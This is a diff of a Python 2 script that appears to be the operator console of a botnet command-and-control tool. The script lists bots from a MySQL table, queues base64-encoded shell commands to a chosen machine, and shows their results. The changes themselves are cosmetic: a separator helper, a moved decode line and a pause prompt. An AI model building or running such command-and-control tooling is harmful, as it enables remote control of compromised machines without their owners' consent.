@@ -4,10 +4,16 @@ import MySQLdb
 import sys
 import base64
 import ConfigParser
+import time
+
+def printSeperator(title):
+	print
+	print "#"*85
+	print "### " + title
+	print
 
 def sendCommand(botID, osT, c, db):
-	print
-	print "Send the following command to machineID: " + botID
+	printSeperator("Send Command to machineID: " + botID)
 	selection = raw_input("$ ")
 	encodedSelection = base64.b64encode(selection)
 	if len(selection) > 1:
@@ -26,12 +32,11 @@ def displayResults(actionID, c, db):
 			botID = row[1]
 			osType = row[2]
 			httpCommand = base64.b64decode(row[3])
-			httpResults = base64.b64decode(row[4])
 			executed = row[5]
-			print
-			print "Action ID: " + id + "  BotID: " + botID + " OS Type: " + osType
-			print
+			printSeperator("Display Results for Action ID: " + id)
+			print "BotID: " + botID + " OS Type: " + osType
 			if executed == 'Y':
+				httpResults = base64.b64decode(row[4])
 				print "Command Executed: " + httpCommand
 				print
 				print httpResults
@@ -39,6 +44,7 @@ def displayResults(actionID, c, db):
 			else:
 				print "Command is Pending: " + httpCommand
 				print
+		raw_input("Press any key to continue...")
 
 
 def controlBot(botID, cur, db):
@@ -47,8 +53,7 @@ def controlBot(botID, cur, db):
 		cur.execute(sql)
 		db.commit()
 		if (cur.rowcount > 0):
-			print 
-			print "Command History for BotID " + botID
+			printSeperator("Command History for BotID: " + botID)
 			print "Select the number preceeding the command to view the results of the command."
 			print
 			idList = []
@@ -88,7 +93,7 @@ def main():
 	db = MySQLdb.connect(host=myHost, user=myUser, passwd=myPass, db=myDB)
 	cursor = db.cursor()
 	while True:
-		print 
+		printSeperator("Main Menu")
 		print "Select the number preceding the botID to interact with it:"
 		print
 		sql = "SELECT machineID, id FROM botInfo ORDER BY id DESC"
